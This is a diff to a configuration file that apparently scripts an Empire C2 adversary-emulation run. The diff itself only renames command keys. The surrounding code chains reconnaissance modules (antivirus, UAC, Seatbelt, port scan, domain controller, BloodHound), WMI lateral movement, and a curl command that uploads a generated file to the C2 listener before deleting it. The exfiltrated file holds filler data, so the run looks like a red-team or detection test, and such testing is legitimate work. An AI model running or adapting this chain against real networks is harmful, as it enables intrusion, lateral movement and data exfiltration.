@@ -232,9 +232,9 @@ action "agent_action" "antivirusproduct" {
     timeout    = "180"
     task_name  = resource.task.c2_task.task_name
     agent_name = action.task_action.execute_stager.action_function.wait_for_c2.agent_info.name
-    command    = "execute_agent_module"
+    command    = "execute_empire_agent_module"
 
-    execute_agent_module = {
+    execute_empire_agent_module = {
         module            = "powershell/situational_awareness/host/antivirusproduct"
         wait_for_results  = "true"
         completion_string = "completed"
@@ -246,10 +246,10 @@ action "agent_action" "dnsserver" {
     timeout    = "180"
     task_name  = resource.task.c2_task.task_name
     agent_name = action.task_action.execute_stager.action_function.wait_for_c2.agent_info.name
-    command    = "execute_agent_module"
+    command    = "execute_empire_agent_module"
     depends_on = action.agent_action.antivirusproduct
     
-    execute_agent_module = {
+    execute_empire_agent_module = {
         module            = "powershell/situational_awareness/host/dnsserver"
         wait_for_results  = "true"
         completion_string = "completed"
@@ -261,10 +261,10 @@ action "agent_action" "get_proxy" {
     timeout    = "180"
     task_name  = resource.task.c2_task.task_name
     agent_name = action.task_action.execute_stager.action_function.wait_for_c2.agent_info.name
-    command    = "execute_agent_module"
+    command    = "execute_empire_agent_module"
     depends_on = action.agent_action.dnsserver
 
-    execute_agent_module = {
+    execute_empire_agent_module = {
         module            = "powershell/situational_awareness/host/get_proxy"
         wait_for_results  = "true"
         completion_string = "completed"
@@ -276,10 +276,10 @@ action "agent_action" "get_uaclevel" {
     timeout    = "180"
     task_name  = resource.task.c2_task.task_name
     agent_name = action.task_action.execute_stager.action_function.wait_for_c2.agent_info.name
-    command    = "execute_agent_module"
+    command    = "execute_empire_agent_module"
     depends_on = action.agent_action.get_proxy
 
-    execute_agent_module = {
+    execute_empire_agent_module = {
         module            = "powershell/situational_awareness/host/get_uaclevel"
         wait_for_results  = "true"
         completion_string = "completed"
@@ -291,10 +291,10 @@ action "agent_action" "seatbelt_user" {
     timeout    = "300"
     task_name  = resource.task.c2_task.task_name
     agent_name = action.task_action.execute_stager.action_function.wait_for_c2.agent_info.name
-    command    = "execute_agent_module"
+    command    = "execute_empire_agent_module"
     depends_on = action.agent_action.get_uaclevel
 
-    execute_agent_module = {
+    execute_empire_agent_module = {
         module            = "powershell/situational_awareness/host/seatbelt"
         wait_for_results  = "true"
         completion_string = "Completed"
@@ -316,10 +316,10 @@ action "agent_action" "seatbelt_system" {
     timeout    = "300"
     task_name  = resource.task.c2_task.task_name
     agent_name = action.task_action.execute_stager.action_function.wait_for_c2.agent_info.name
-    command    = "execute_agent_module"
+    command    = "execute_empire_agent_module"
     depends_on = action.agent_action.seatbelt_user
 
-    execute_agent_module = {
+    execute_empire_agent_module = {
         module            = "powershell/situational_awareness/host/seatbelt"
         wait_for_results  = "true"
         completion_string = "Completed"
@@ -341,10 +341,10 @@ action "agent_action" "reverse_dns" {
     timeout    = "600"
     task_name  = resource.task.c2_task.task_name
     agent_name = action.task_action.execute_stager.action_function.wait_for_c2.agent_info.name
-    command    = "execute_agent_module"
+    command    = "execute_empire_agent_module"
     depends_on = action.agent_action.seatbelt_system
 
-    execute_agent_module = {
+    execute_empire_agent_module = {
         module            = "powershell/situational_awareness/network/reverse_dns"
         wait_for_results  = "true"
         completion_string = "completed"
@@ -360,10 +360,10 @@ action "agent_action" "portscan" {
     timeout    = "900"
     task_name  = resource.task.c2_task.task_name
     agent_name = action.task_action.execute_stager.action_function.wait_for_c2.agent_info.name
-    command    = "execute_agent_module"
+    command    = "execute_empire_agent_module"
     depends_on = action.agent_action.reverse_dns
 
-    execute_agent_module = {
+    execute_empire_agent_module = {
         module            = "powershell/situational_awareness/network/portscan"
         wait_for_results  = "true"
         completion_string = "completed"
@@ -380,10 +380,10 @@ action "agent_action" "get_domain_controller" {
     timeout    = "180"
     task_name  = resource.task.c2_task.task_name
     agent_name = action.task_action.execute_stager.action_function.wait_for_c2.agent_info.name
-    command    = "execute_agent_module"
+    command    = "execute_empire_agent_module"
     depends_on = action.agent_action.portscan
 
-    execute_agent_module = {
+    execute_empire_agent_module = {
         module            = "powershell/situational_awareness/network/powerview/get_domain_controller"
         wait_for_results  = "true"
         completion_string = "completed"
@@ -395,10 +395,10 @@ action "agent_action" "get_domain_policy" {
     timeout    = "180"
     task_name  = resource.task.c2_task.task_name
     agent_name = action.task_action.execute_stager.action_function.wait_for_c2.agent_info.name
-    command    = "execute_agent_module"
+    command    = "execute_empire_agent_module"
     depends_on = action.agent_action.get_domain_controller
 
-    execute_agent_module = {
+    execute_empire_agent_module = {
         module            = "powershell/situational_awareness/network/powerview/get_domain_policy"
         wait_for_results  = "true"
         completion_string = "completed"
@@ -414,10 +414,10 @@ action "agent_action" "bloodhound" {
     timeout    = "900"
     task_name  = resource.task.c2_task.task_name
     agent_name = action.task_action.execute_stager.action_function.wait_for_c2.agent_info.name
-    command    = "execute_agent_module"
+    command    = "execute_empire_agent_module"
     depends_on = action.agent_action.get_domain_policy
 
-    execute_agent_module = {
+    execute_empire_agent_module = {
         module            = "powershell/situational_awareness/network/bloodhound"
         wait_for_results  = "true"
         completion_string = "completed"
@@ -435,10 +435,10 @@ action "agent_action" "invoke_wmi" {
     timeout    = "180"
     task_name  = resource.task.c2_task.task_name
     agent_name = action.task_action.execute_stager.action_function.wait_for_c2.agent_info.name
-    command    = "execute_agent_module"
+    command    = "execute_empire_agent_module"
     depends_on = action.agent_action.bloodhound
 
-    execute_agent_module = {
+    execute_empire_agent_module = {
         module           = "powershell/lateral_movement/invoke_wmi"
         wait_for_results = "false"
 
@@ -464,10 +464,10 @@ action "agent_action" "create_exfil_file" {
     timeout    = "300"
     task_name  = resource.task.c2_task.task_name
     agent_name = action.task_action.execute_stager.action_function.wait_for_c2.agent_info.name
-    command    = "execute_agent_shell_command"
+    command    = "execute_empire_agent_shell_command"
     depends_on = action.agent_action.invoke_wmi
 
-    execute_agent_shell_command = {
+    execute_empire_agent_shell_command = {
         command          = "New-Item ${variable.exfil_path}\${variable.exfil_file}; while((Get-Item -Path ${variable.exfil_path}\${variable.exfil_file}).Length/1MB -le ${variable.exfil_size}){'1234567890qwertyasdfjkl;'*1048576 >> ${variable.exfil_path}\${variable.exfil_file}}"
         wait_for_results = "true"
     }
@@ -478,10 +478,10 @@ action "agent_action" "upload_exfil_file" {
     timeout    = "600"
     task_name  = resource.task.c2_task.task_name
     agent_name = action.task_action.execute_stager.action_function.wait_for_c2.agent_info.name
-    command    = "execute_agent_shell_command"
+    command    = "execute_empire_agent_shell_command"
     depends_on = action.agent_action.create_exfil_file
 
-    execute_agent_shell_command = {
+    execute_empire_agent_shell_command = {
         command          = "c:\Windows\System32\curl.exe -s -k -F files=@${variable.exfil_path}\${variable.exfil_file} https://${resource.listener.http_listener.host_name}.${resource.listener.http_listener.domain_name}:443/upload; echo done"
         wait_for_results = "true"
     }
@@ -492,10 +492,10 @@ action "agent_action" "delete_exfil_file" {
     timeout    = "180"
     task_name  = resource.task.c2_task.task_name
     agent_name = action.task_action.execute_stager.action_function.wait_for_c2.agent_info.name
-    command    = "execute_agent_shell_command"
+    command    = "execute_empire_agent_shell_command"
     depends_on = action.agent_action.upload_exfil_file
 
-    execute_agent_shell_command = {
+    execute_empire_agent_shell_command = {
         command          = "del ${variable.exfil_path}\${variable.exfil_file}"
         wait_for_results = "true"
     }
